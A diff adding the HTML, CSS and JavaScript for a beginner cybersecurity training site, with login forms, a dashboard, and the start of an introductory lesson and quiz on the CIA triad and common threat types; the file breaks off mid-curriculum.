@@ -1,0 +1,2054 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberLearn — Cybersecurity Training</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0a0e1a;
+  --surface:#111827;
+  --surface2:#1a2235;
+  --border:#1f2d45;
+  --accent:#00f5a0;
+  --accent2:#00d4ff;
+  --accent3:#ff6b35;
+  --text:#e2e8f0;
+  --muted:#64748b;
+  --red:#ef4444;
+  --yellow:#f59e0b;
+  --green:#10b981;
+  --purple:#8b5cf6;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
+
+/* ── ANIMATED BG ── */
+body::before{content:'';position:fixed;inset:0;background:
+  radial-gradient(ellipse at 20% 50%, rgba(0,245,160,.04) 0%, transparent 60%),
+  radial-gradient(ellipse at 80% 20%, rgba(0,212,255,.04) 0%, transparent 60%);
+  pointer-events:none;z-index:0;}
+
+/* ── AUTH ── */
+.auth-screen{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:1000;}
+.auth-screen.hidden{display:none;}
+.auth-card{width:420px;max-width:95vw;background:var(--surface);border:1px solid var(--border);border-radius:16px;overflow:hidden;box-shadow:0 0 60px rgba(0,245,160,.08);}
+.auth-header{padding:2rem;text-align:center;border-bottom:1px solid var(--border);position:relative;overflow:hidden;}
+.auth-header::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(0,245,160,.08),rgba(0,212,255,.05));pointer-events:none;}
+.auth-logo{font-family:'Space Mono',monospace;font-size:1.5rem;color:var(--accent);margin-bottom:.25rem;}
+.auth-logo span{color:var(--accent2);}
+.auth-sub{font-size:.78rem;color:var(--muted);text-transform:uppercase;letter-spacing:2px;}
+.auth-body{padding:1.75rem;}
+.auth-tabs{display:flex;background:var(--bg);border-radius:8px;padding:.25rem;margin-bottom:1.25rem;gap:.25rem;}
+.auth-tab{flex:1;padding:.5rem;text-align:center;font-size:.8rem;font-weight:600;color:var(--muted);cursor:pointer;border-radius:6px;transition:all .2s;}
+.auth-tab.active{background:var(--surface2);color:var(--accent);border:1px solid var(--border);}
+.auth-panel{display:none;}.auth-panel.active{display:block;}
+.field{margin-bottom:1rem;}
+.field label{display:block;font-size:.72rem;font-weight:600;text-transform:uppercase;letter-spacing:.8px;color:var(--muted);margin-bottom:.4rem;}
+.field input{width:100%;padding:.65rem .9rem;background:var(--bg);border:1.5px solid var(--border);border-radius:8px;color:var(--text);font-family:'DM Sans',sans-serif;font-size:.9rem;outline:none;transition:border-color .2s;}
+.field input:focus{border-color:var(--accent);}
+.auth-err{font-size:.78rem;color:var(--red);min-height:1rem;margin-bottom:.75rem;}
+.auth-ok{font-size:.78rem;color:var(--green);min-height:1rem;margin-bottom:.75rem;}
+.auth-btn{width:100%;padding:.7rem;background:var(--accent);color:#0a0e1a;border:none;border-radius:8px;font-family:'DM Sans',sans-serif;font-weight:700;font-size:.95rem;cursor:pointer;transition:all .2s;letter-spacing:.3px;}
+.auth-btn:hover{background:#00d4a0;box-shadow:0 0 20px rgba(0,245,160,.3);}
+.auth-btn:disabled{background:var(--muted);cursor:not-allowed;box-shadow:none;}
+.auth-note{font-size:.72rem;color:var(--muted);text-align:center;margin-top:.85rem;line-height:1.5;}
+
+/* ── TOPBAR ── */
+.topbar{background:var(--surface);border-bottom:1px solid var(--border);height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 1.5rem;position:sticky;top:0;z-index:200;box-shadow:0 2px 20px rgba(0,0,0,.3);}
+.topbar-logo{font-family:'Space Mono',monospace;font-size:1.1rem;color:var(--accent);}
+.topbar-logo span{color:var(--accent2);}
+.topbar-right{display:flex;align-items:center;gap:1rem;}
+.xp-bar-wrap{display:flex;align-items:center;gap:.5rem;}
+.xp-label{font-size:.72rem;color:var(--muted);font-family:'Space Mono',monospace;}
+.xp-bar{width:80px;height:6px;background:var(--border);border-radius:10px;overflow:hidden;}
+.xp-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:10px;transition:width .5s ease;}
+.level-badge{background:var(--surface2);border:1px solid var(--accent);color:var(--accent);font-family:'Space Mono',monospace;font-size:.7rem;padding:.2rem .6rem;border-radius:20px;}
+.profile-btn{display:flex;align-items:center;gap:.5rem;background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:.3rem .75rem;cursor:pointer;color:var(--text);font-size:.8rem;font-weight:600;transition:all .18s;}
+.profile-btn:hover{border-color:var(--accent);color:var(--accent);}
+.avatar{width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;color:#0a0e1a;}
+
+/* ── LAYOUT ── */
+.app{display:flex;min-height:calc(100vh - 56px);position:relative;z-index:1;}
+
+/* ── SIDEBAR ── */
+.sidebar{width:240px;background:var(--surface);border-right:1px solid var(--border);flex-shrink:0;padding:1rem 0;overflow-y:auto;}
+.sidebar-section{padding:.35rem 1rem;font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--muted);margin-top:.75rem;}
+.nav-item{display:flex;align-items:center;gap:.65rem;padding:.6rem 1rem;cursor:pointer;font-size:.85rem;color:var(--muted);transition:all .18s;border-left:3px solid transparent;position:relative;}
+.nav-item:hover{color:var(--text);background:rgba(255,255,255,.03);}
+.nav-item.active{color:var(--accent);border-left-color:var(--accent);background:rgba(0,245,160,.05);}
+.nav-item .icon{font-size:1rem;width:20px;text-align:center;}
+.nav-badge{margin-left:auto;background:var(--accent);color:#0a0e1a;font-size:.6rem;font-weight:700;padding:.1rem .4rem;border-radius:10px;font-family:'Space Mono',monospace;}
+.nav-badge.done{background:var(--green);}
+.nav-badge.locked{background:var(--border);color:var(--muted);}
+
+/* ── MAIN CONTENT ── */
+.content{flex:1;padding:1.75rem;overflow-y:auto;}
+.page{display:none;}.page.active{display:block;}
+
+/* ── DASHBOARD ── */
+.dash-welcome{margin-bottom:1.75rem;}
+.dash-welcome h1{font-family:'Space Mono',monospace;font-size:1.5rem;color:var(--text);margin-bottom:.3rem;}
+.dash-welcome h1 span{color:var(--accent);}
+.dash-welcome p{font-size:.875rem;color:var(--muted);}
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;margin-bottom:1.75rem;}
+.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1rem 1.25rem;position:relative;overflow:hidden;}
+.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
+.stat-card.green::before{background:var(--green);}
+.stat-card.blue::before{background:var(--accent2);}
+.stat-card.orange::before{background:var(--accent3);}
+.stat-card.purple::before{background:var(--purple);}
+.stat-label{font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);font-weight:600;margin-bottom:.4rem;}
+.stat-value{font-family:'Space Mono',monospace;font-size:1.6rem;color:var(--text);}
+.stat-sub{font-size:.72rem;color:var(--muted);margin-top:.2rem;}
+
+/* ── MODULE CARDS ── */
+.modules-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1rem;}
+.module-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;cursor:pointer;transition:all .25s;position:relative;}
+.module-card:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,245,160,.08);}
+.module-card.locked{opacity:.5;cursor:not-allowed;}
+.module-card.locked:hover{transform:none;border-color:var(--border);box-shadow:none;}
+.module-card.completed{border-color:var(--green);}
+.module-top{padding:1.25rem;border-bottom:1px solid var(--border);}
+.module-icon{font-size:2rem;margin-bottom:.65rem;}
+.module-title{font-weight:700;font-size:.95rem;margin-bottom:.3rem;color:var(--text);}
+.module-desc{font-size:.78rem;color:var(--muted);line-height:1.5;}
+.module-bottom{padding:.75rem 1.25rem;display:flex;align-items:center;justify-content:space-between;}
+.module-meta{font-size:.72rem;color:var(--muted);}
+.module-status{font-size:.7rem;font-weight:700;padding:.2rem .6rem;border-radius:4px;font-family:'Space Mono',monospace;}
+.ms-new{background:rgba(0,245,160,.1);color:var(--accent);border:1px solid rgba(0,245,160,.2);}
+.ms-done{background:rgba(16,185,129,.1);color:var(--green);border:1px solid rgba(16,185,129,.2);}
+.ms-lock{background:var(--border);color:var(--muted);}
+.module-progress{height:3px;background:var(--border);margin-top:.65rem;}
+.module-progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .4s;}
+
+/* ── LESSON VIEW ── */
+.lesson-header{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.25rem 1.5rem;margin-bottom:1.25rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem;}
+.lesson-breadcrumb{font-size:.75rem;color:var(--muted);margin-bottom:.3rem;}
+.lesson-breadcrumb span{color:var(--accent);}
+.lesson-title{font-family:'Space Mono',monospace;font-size:1.1rem;color:var(--text);}
+.lesson-body{display:grid;grid-template-columns:1fr 300px;gap:1.25rem;}
+.lesson-main{display:flex;flex-direction:column;gap:1.25rem;}
+.lesson-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;}
+.lesson-card-head{padding:.85rem 1.25rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:.5rem;font-weight:700;font-size:.875rem;}
+.lesson-card-body{padding:1.25rem;}
+.lesson-text{font-size:.875rem;line-height:1.8;color:var(--text);}
+.lesson-text h3{font-family:'Space Mono',monospace;color:var(--accent);font-size:.9rem;margin:1rem 0 .4rem;}
+.lesson-text p{margin-bottom:.75rem;}
+.lesson-text ul{margin:.5rem 0 .75rem 1.25rem;}
+.lesson-text li{margin-bottom:.3rem;}
+.code-block{background:#0d1117;border:1px solid var(--border);border-radius:8px;padding:1rem;font-family:'Space Mono',monospace;font-size:.78rem;color:#a5f3a0;line-height:1.6;overflow-x:auto;margin:.75rem 0;}
+.tip-box{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.2);border-radius:8px;padding:.85rem 1rem;font-size:.82rem;color:var(--accent2);margin:.75rem 0;display:flex;gap:.65rem;}
+.warn-box{background:rgba(255,107,53,.05);border:1px solid rgba(255,107,53,.2);border-radius:8px;padding:.85rem 1rem;font-size:.82rem;color:var(--accent3);margin:.75rem 0;display:flex;gap:.65rem;}
+.video-wrap{position:relative;padding-bottom:56.25%;height:0;border-radius:8px;overflow:hidden;background:#000;}
+.video-wrap iframe{position:absolute;inset:0;width:100%;height:100%;}
+
+/* ── SIDEBAR LESSON NAV ── */
+.lesson-nav-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;position:sticky;top:1rem;}
+.lesson-nav-head{padding:.85rem 1rem;border-bottom:1px solid var(--border);font-weight:700;font-size:.8rem;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;}
+.lesson-nav-item{display:flex;align-items:center;gap:.65rem;padding:.6rem 1rem;cursor:pointer;font-size:.8rem;color:var(--muted);transition:all .18s;border-left:2px solid transparent;}
+.lesson-nav-item:hover{color:var(--text);background:rgba(255,255,255,.02);}
+.lesson-nav-item.active{color:var(--accent);border-left-color:var(--accent);background:rgba(0,245,160,.04);}
+.lesson-nav-item.done{color:var(--green);}
+.lesson-check{width:16px;height:16px;border-radius:50%;border:1.5px solid var(--border);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:.6rem;}
+.lesson-check.done{background:var(--green);border-color:var(--green);color:#fff;}
+.lesson-check.active{border-color:var(--accent);}
+
+/* ── QUIZ ── */
+.quiz-wrap{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
+.quiz-q{font-weight:700;font-size:.95rem;margin-bottom:1rem;line-height:1.5;}
+.quiz-q .qnum{font-family:'Space Mono',monospace;color:var(--accent);font-size:.75rem;display:block;margin-bottom:.3rem;}
+.quiz-options{display:flex;flex-direction:column;gap:.6rem;}
+.quiz-opt{padding:.75rem 1rem;background:var(--bg);border:1.5px solid var(--border);border-radius:8px;cursor:pointer;font-size:.875rem;transition:all .2s;display:flex;align-items:center;gap:.75rem;}
+.quiz-opt:hover{border-color:var(--accent2);background:rgba(0,212,255,.04);}
+.quiz-opt.selected{border-color:var(--accent);background:rgba(0,245,160,.06);}
+.quiz-opt.correct{border-color:var(--green);background:rgba(16,185,129,.08);color:var(--green);}
+.quiz-opt.wrong{border-color:var(--red);background:rgba(239,68,68,.06);color:var(--red);}
+.quiz-opt-letter{width:24px;height:24px;border-radius:6px;background:var(--border);display:flex;align-items:center;justify-content:center;font-family:'Space Mono',monospace;font-size:.7rem;font-weight:700;flex-shrink:0;}
+.quiz-feedback{margin-top:1rem;padding:.85rem 1rem;border-radius:8px;font-size:.82rem;display:none;}
+.quiz-feedback.show{display:block;}
+.quiz-feedback.correct{background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.2);color:var(--green);}
+.quiz-feedback.wrong{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);color:var(--red);}
+.quiz-progress{display:flex;gap:.35rem;margin-bottom:1.25rem;}
+.qp-dot{width:8px;height:8px;border-radius:50%;background:var(--border);transition:background .3s;}
+.qp-dot.done{background:var(--green);}
+.qp-dot.active{background:var(--accent);}
+.quiz-result{text-align:center;padding:2rem;}
+.quiz-result .score{font-family:'Space Mono',monospace;font-size:3rem;margin-bottom:.5rem;}
+.quiz-result .score.pass{color:var(--green);}
+.quiz-result .score.fail{color:var(--red);}
+
+/* ── CHALLENGE ── */
+.challenge-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.challenge-title{font-family:'Space Mono',monospace;font-size:.9rem;color:var(--accent);margin-bottom:.5rem;}
+.challenge-desc{font-size:.82rem;color:var(--muted);line-height:1.6;margin-bottom:1rem;}
+.challenge-input{width:100%;padding:.65rem .9rem;background:var(--bg);border:1.5px solid var(--border);border-radius:8px;color:var(--text);font-family:'Space Mono',monospace;font-size:.85rem;outline:none;margin-bottom:.65rem;}
+.challenge-input:focus{border-color:var(--accent);}
+.challenge-hint{font-size:.75rem;color:var(--muted);margin-bottom:.65rem;cursor:pointer;display:flex;align-items:center;gap:.35rem;}
+.challenge-hint-text{display:none;background:rgba(245,158,11,.06);border:1px solid rgba(245,158,11,.2);border-radius:6px;padding:.6rem .85rem;font-size:.78rem;color:var(--yellow);margin-bottom:.65rem;}
+.challenge-hint-text.show{display:block;}
+.diff-badge{display:inline-flex;align-items:center;padding:.18rem .6rem;border-radius:4px;font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;margin-bottom:.65rem;}
+.diff-easy{background:rgba(16,185,129,.1);color:var(--green);border:1px solid rgba(16,185,129,.2);}
+.diff-medium{background:rgba(245,158,11,.1);color:var(--yellow);border:1px solid rgba(245,158,11,.2);}
+.diff-hard{background:rgba(239,68,68,.1);color:var(--red);border:1px solid rgba(239,68,68,.2);}
+
+/* ── BUTTONS ── */
+.btn{padding:.5rem 1.1rem;border-radius:8px;border:none;cursor:pointer;font-family:'DM Sans',sans-serif;font-weight:600;font-size:.85rem;display:inline-flex;align-items:center;gap:.4rem;transition:all .2s;white-space:nowrap;}
+.btn-primary{background:var(--accent);color:#0a0e1a;}.btn-primary:hover{background:#00d4a0;box-shadow:0 0 15px rgba(0,245,160,.25);}
+.btn-secondary{background:var(--surface2);color:var(--text);border:1px solid var(--border);}.btn-secondary:hover{border-color:var(--accent);color:var(--accent);}
+.btn-ghost{background:transparent;color:var(--muted);border:1px solid var(--border);}.btn-ghost:hover{color:var(--text);border-color:var(--muted);}
+.btn-sm{padding:.3rem .75rem;font-size:.78rem;}
+
+/* ── PROGRESS PAGE ── */
+.progress-section{margin-bottom:1.75rem;}
+.progress-section h2{font-family:'Space Mono',monospace;font-size:.95rem;color:var(--accent);margin-bottom:1rem;}
+.progress-module{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1rem 1.25rem;margin-bottom:.65rem;display:flex;align-items:center;gap:1rem;}
+.progress-module-icon{font-size:1.4rem;width:36px;text-align:center;}
+.progress-module-info{flex:1;}
+.progress-module-name{font-weight:600;font-size:.875rem;margin-bottom:.3rem;}
+.progress-bar{height:6px;background:var(--border);border-radius:10px;overflow:hidden;}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:10px;transition:width .6s ease;}
+.progress-pct{font-family:'Space Mono',monospace;font-size:.75rem;color:var(--muted);width:36px;text-align:right;}
+
+/* ── LOADING ── */
+.loading-overlay{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:900;}
+.loading-overlay.hidden{display:none;}
+.loading-content{text-align:center;}
+.loading-logo{font-family:'Space Mono',monospace;font-size:1.5rem;color:var(--accent);margin-bottom:1rem;}
+.loading-logo span{color:var(--accent2);}
+.spinner{width:32px;height:32px;border:2px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .7s linear infinite;margin:0 auto .75rem;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.loading-content p{font-size:.8rem;color:var(--muted);}
+
+@media(max-width:900px){
+  .sidebar{display:none;}
+  .lesson-body{grid-template-columns:1fr;}
+  .stats-grid{grid-template-columns:1fr 1fr;}
+}
+</style>
+</head>
+<body>
+
+<!-- LOADING -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-content">
+    <div class="loading-logo">Cyber<span>Learn</span></div>
+    <div class="spinner"></div>
+    <p id="loadingMsg">Initializing…</p>
+  </div>
+</div>
+
+<!-- AUTH -->
+<div class="auth-screen" id="authScreen">
+  <div class="auth-card">
+    <div class="auth-header">
+      <div class="auth-logo">Cyber<span>Learn</span></div>
+      <div class="auth-sub">Cybersecurity Training Platform</div>
+    </div>
+    <div class="auth-body">
+      <div class="auth-tabs">
+        <div class="auth-tab active" onclick="showAuthTab('login')">Sign In</div>
+        <div class="auth-tab" onclick="showAuthTab('signup')">Sign Up</div>
+        <div class="auth-tab" onclick="showAuthTab('reset')">Reset</div>
+      </div>
+      <!-- LOGIN -->
+      <div class="auth-panel active" id="panel-login">
+        <div class="field"><label>Email</label><input type="email" id="l-email" placeholder="your@email.com" onkeydown="if(event.key==='Enter')doLogin()"></div>
+        <div class="field"><label>Password</label><input type="password" id="l-pw" placeholder="Your password" onkeydown="if(event.key==='Enter')doLogin()"></div>
+        <div class="auth-err" id="l-err"></div>
+        <button class="auth-btn" id="l-btn" onclick="doLogin()">→ Sign In</button>
+      </div>
+      <!-- SIGNUP -->
+      <div class="auth-panel" id="panel-signup">
+        <div class="field"><label>Full Name</label><input type="text" id="s-name" placeholder="Your name"></div>
+        <div class="field"><label>Email</label><input type="email" id="s-email" placeholder="your@email.com"></div>
+        <div class="field"><label>Password</label><input type="password" id="s-pw" placeholder="Min 8 characters"></div>
+        <div class="field"><label>Confirm Password</label><input type="password" id="s-pw2" placeholder="Repeat password"></div>
+        <div class="auth-err" id="s-err"></div>
+        <div class="auth-ok" id="s-ok"></div>
+        <button class="auth-btn" id="s-btn" onclick="doSignup()">→ Create Account</button>
+      </div>
+      <!-- RESET -->
+      <div class="auth-panel" id="panel-reset">
+        <div class="field"><label>Email</label><input type="email" id="r-email" placeholder="your@email.com"></div>
+        <div class="auth-err" id="r-err"></div>
+        <div class="auth-ok" id="r-ok"></div>
+        <button class="auth-btn" id="r-btn" onclick="doReset()">→ Send Reset Link</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TOPBAR -->
+<div class="topbar">
+  <div class="topbar-logo">Cyber<span>Learn</span></div>
+  <div class="topbar-right">
+    <div class="xp-bar-wrap">
+      <span class="xp-label" id="xpLabel">0 XP</span>
+      <div class="xp-bar"><div class="xp-fill" id="xpFill" style="width:0%"></div></div>
+    </div>
+    <div class="level-badge" id="levelBadge">LVL 0</div>
+    <div class="profile-btn" onclick="switchPage('progress')">
+      <div class="avatar" id="topAvatar">?</div>
+      <span id="topName">Account</span>
+    </div>
+  </div>
+</div>
+
+<!-- APP -->
+<div class="app">
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-section">Navigation</div>
+    <div class="nav-item active" data-page="dashboard" onclick="switchPage('dashboard')"><span class="icon">🏠</span> Dashboard</div>
+    <div class="nav-item" data-page="progress" onclick="switchPage('progress')"><span class="icon">📊</span> My Progress</div>
+
+    <div class="sidebar-section">Modules</div>
+    <div class="nav-item" data-page="m0" onclick="openModule(0)"><span class="icon">🔐</span> Intro to CyberSec <span class="nav-badge" id="nb0">NEW</span></div>
+    <div class="nav-item" data-page="m1" onclick="openModule(1)"><span class="icon">🌐</span> Networking Basics <span class="nav-badge" id="nb1">NEW</span></div>
+    <div class="nav-item" data-page="m2" onclick="openModule(2)"><span class="icon">🐧</span> Linux for Security <span class="nav-badge" id="nb2">NEW</span></div>
+    <div class="nav-item" data-page="m3" onclick="openModule(3)"><span class="icon">🔑</span> Cryptography <span class="nav-badge" id="nb3">NEW</span></div>
+    <div class="nav-item" data-page="m4" onclick="openModule(4)"><span class="icon">🎭</span> Social Engineering <span class="nav-badge" id="nb4">NEW</span></div>
+    <div class="nav-item" data-page="m5" onclick="openModule(5)"><span class="icon">🌍</span> Web Security <span class="nav-badge" id="nb5">NEW</span></div>
+
+    <div class="sidebar-section">Practice</div>
+    <div class="nav-item" data-page="challenges" onclick="switchPage('challenges')"><span class="icon">⚡</span> Challenges</div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="content">
+
+    <!-- DASHBOARD -->
+    <div class="page active" id="page-dashboard">
+      <div class="dash-welcome">
+        <h1>Welcome back, <span id="dashName">Hacker</span> 👾</h1>
+        <p>Continue your cybersecurity journey. You're doing great!</p>
+      </div>
+      <div class="stats-grid">
+        <div class="stat-card green"><div class="stat-label">Modules Completed</div><div class="stat-value" id="st-modules">0/6</div><div class="stat-sub">Keep going!</div></div>
+        <div class="stat-card blue"><div class="stat-label">Quizzes Passed</div><div class="stat-value" id="st-quizzes">0</div><div class="stat-sub">Test your knowledge</div></div>
+        <div class="stat-card orange"><div class="stat-label">Challenges Solved</div><div class="stat-value" id="st-challenges">0</div><div class="stat-sub">Hands-on practice</div></div>
+        <div class="stat-card purple"><div class="stat-label">Total XP</div><div class="stat-value" id="st-xp">0</div><div class="stat-sub">Experience points</div></div>
+      </div>
+      <h2 style="font-family:'Space Mono',monospace;font-size:.95rem;color:var(--accent);margin-bottom:1rem;">📚 All Modules</h2>
+      <div class="modules-grid" id="modulesGrid"></div>
+    </div>
+
+    <!-- MODULE LESSON PAGE -->
+    <div class="page" id="page-module">
+      <div class="lesson-header">
+        <div>
+          <div class="lesson-breadcrumb">Modules → <span id="lessonModuleTitle">—</span></div>
+          <div class="lesson-title" id="lessonTitle">—</div>
+        </div>
+        <div style="display:flex;gap:.65rem;">
+          <button class="btn btn-ghost btn-sm" onclick="switchPage('dashboard')">← Back</button>
+          <button class="btn btn-primary btn-sm" id="nextLessonBtn" onclick="nextLesson()">Next →</button>
+        </div>
+      </div>
+      <div class="lesson-body">
+        <div class="lesson-main" id="lessonMain"></div>
+        <div>
+          <div class="lesson-nav-card">
+            <div class="lesson-nav-head">Module Contents</div>
+            <div id="lessonNavList"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- CHALLENGES PAGE -->
+    <div class="page" id="page-challenges">
+      <div style="margin-bottom:1.5rem;">
+        <h1 style="font-family:'Space Mono',monospace;font-size:1.2rem;color:var(--text);margin-bottom:.3rem;">⚡ Challenges</h1>
+        <p style="font-size:.85rem;color:var(--muted);">Solve real-world cybersecurity challenges. Each correct answer earns XP.</p>
+      </div>
+      <div id="challengesList"></div>
+    </div>
+
+    <!-- PROGRESS PAGE -->
+    <div class="page" id="page-progress">
+      <div style="margin-bottom:1.5rem;">
+        <h1 style="font-family:'Space Mono',monospace;font-size:1.2rem;color:var(--text);margin-bottom:.3rem;">📊 My Progress</h1>
+        <p style="font-size:.85rem;color:var(--muted);">Track your cybersecurity learning journey.</p>
+      </div>
+      <div class="stats-grid" style="margin-bottom:1.75rem;">
+        <div class="stat-card green"><div class="stat-label">Total XP</div><div class="stat-value" id="pr-xp">0</div></div>
+        <div class="stat-card blue"><div class="stat-label">Level</div><div class="stat-value" id="pr-level">0</div></div>
+        <div class="stat-card orange"><div class="stat-label">Quizzes Passed</div><div class="stat-value" id="pr-quizzes">0</div></div>
+        <div class="stat-card purple"><div class="stat-label">Challenges Done</div><div class="stat-value" id="pr-challenges">0</div></div>
+      </div>
+      <div class="progress-section">
+        <h2>Module Progress</h2>
+        <div id="progressModules"></div>
+      </div>
+      <div style="margin-top:1.5rem;">
+        <button class="btn btn-ghost" onclick="doLogout()">🚪 Sign Out</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// ══════════════════════════════════════════════
+// CONFIG
+// ══════════════════════════════════════════════
+const SB_URL = 'https://dgnzmzwmdlshvvnbzkvx.supabase.co';
+const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRnbnptendtZGxzaHZ2bmJ6a3Z4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE0OTI4MzgsImV4cCI6MjA4NzA2ODgzOH0.PwEyYwR7dfoppGPk0qQ8B361ayOFKoi9XK5IVn-b7ds';
+
+// ══════════════════════════════════════════════
+// CURRICULUM DATA
+// ══════════════════════════════════════════════
+const MODULES = [
+  {
+    id:'m0', icon:'🔐', title:'Intro to Cybersecurity', desc:'Understand what cybersecurity is, why it matters, and the key concepts every beginner needs to know.',
+    lessons:[
+      {
+        id:'m0l0', title:'What is Cybersecurity?',
+        content:`<div class="lesson-text">
+          <h3>// What is Cybersecurity?</h3>
+          <p>Cybersecurity is the practice of protecting computers, networks, programs and data from digital attacks, damage or unauthorized access. Think of it as the digital equivalent of locks, guards and alarm systems — but for your data.</p>
+          <div class="tip-box">💡 <div>The global cybersecurity market is worth over <strong>$200 billion</strong> and is one of the fastest growing fields in tech. Skills in this area are in extremely high demand.</div></div>
+          <h3>// The CIA Triad</h3>
+          <p>All of cybersecurity revolves around three core principles:</p>
+          <ul>
+            <li><strong style="color:var(--accent)">Confidentiality</strong> — Only authorized people can access information</li>
+            <li><strong style="color:var(--accent2)">Integrity</strong> — Information is accurate and hasn't been tampered with</li>
+            <li><strong style="color:var(--accent3)">Availability</strong> — Systems and data are accessible when needed</li>
+          </ul>
+          <h3>// Types of Threats</h3>
+          <ul>
+            <li><strong>Malware</strong> — malicious software (viruses, ransomware, spyware)</li>
+            <li><strong>Phishing</strong> — tricking people into revealing sensitive info</li>
+            <li><strong>Man-in-the-Middle</strong> — intercepting communications</li>
+            <li><strong>DDoS</strong> — overwhelming a system with traffic to make it unavailable</li>
+            <li><strong>SQL Injection</strong> — attacking databases via input fields</li>
+          </ul>
+          <div class="warn-box">⚠️ <div>Cybercrime costs the global economy over <strong>$8 trillion per year</strong>. Understanding these threats is the first step to fighting them.</div></div>
+          <h3>// Risk, Vulnerability & Threat</h3>
+          <ul>
+            <li><strong>Vulnerability</strong> — A weakness in a system (e.g. unpatched software)</li>
+            <li><strong>Threat</strong> — Something that could exploit a vulnerability (e.g. a hacker)</li>
+            <li><strong>Risk</strong> — The potential damage if a threat exploits a vulnerability</li>
+          </ul>
+        </div>`,
+        video:'https://www.youtube.com/embed/inWWhr5tnEA',
+        quiz:[
+          {q:'What does the "I" in the CIA Triad stand for?',opts:['Intelligence','Integrity','Integration','Interoperability'],correct:1,exp:'Integrity means information is accurate and has not been tampered with.',trick:false},
+          {q:'A DDoS attack is mainly designed to:',opts:['Steal passwords','Make a system unavailable by overwhelming it','Install malware','Intercept communications'],correct:1,exp:'DDoS (Distributed Denial of Service) floods a system with traffic to make it unavailable.',trick:false},
+          {q:'TRICK: Confidentiality in the CIA Triad means data is always available to everyone.',opts:['True','False'],correct:1,exp:'FALSE. Confidentiality means ONLY authorized people can access data — the opposite of everyone.',trick:true},
+          {q:'What is a vulnerability?',opts:['A type of malware','A hacker tool','A weakness in a system that could be exploited','A strong firewall'],correct:2,exp:'A vulnerability is a weakness or flaw in a system that could be exploited by a threat.',trick:false},
+          {q:'Which of these is an example of a threat?',opts:['Unpatched software','An open port','A hacker attempting to break in','A weak password policy'],correct:2,exp:'A threat is an actor or event that could exploit a vulnerability. An unpatched software is a vulnerability.',trick:false},
+          {q:'TRICK: A system with no vulnerabilities has no risk.',opts:['True','False'],correct:1,exp:'FALSE. Even systems with no known vulnerabilities face risk from unknown (zero-day) vulnerabilities and insider threats.',trick:true},
+          {q:'What does "Availability" in the CIA Triad mean?',opts:['Data is encrypted','Data is only for admins','Systems and data are accessible when needed','Data cannot be modified'],correct:2,exp:'Availability ensures that systems and data are accessible to authorized users when they need them.',trick:false},
+          {q:'Which attack type involves tricking people into revealing their passwords?',opts:['DDoS','SQL Injection','Man-in-the-Middle','Phishing'],correct:3,exp:'Phishing tricks people into revealing sensitive information like passwords through fake emails or websites.',trick:false},
+          {q:'TRICK: Cybersecurity is only about protecting against external attacks.',opts:['True','False'],correct:1,exp:'FALSE. Insider threats (employees, contractors) are one of the biggest cybersecurity risks. Security must protect against both internal and external threats.',trick:true},
+          {q:'What is the correct order of: Vulnerability, Threat, Risk?',opts:['Threat exploits Vulnerability to create Risk','Risk exploits Vulnerability to create Threat','Vulnerability exploits Threat to create Risk','Risk exploits Threat to create Vulnerability'],correct:0,exp:'A Threat exploits a Vulnerability which creates a Risk of damage or loss.',trick:false},
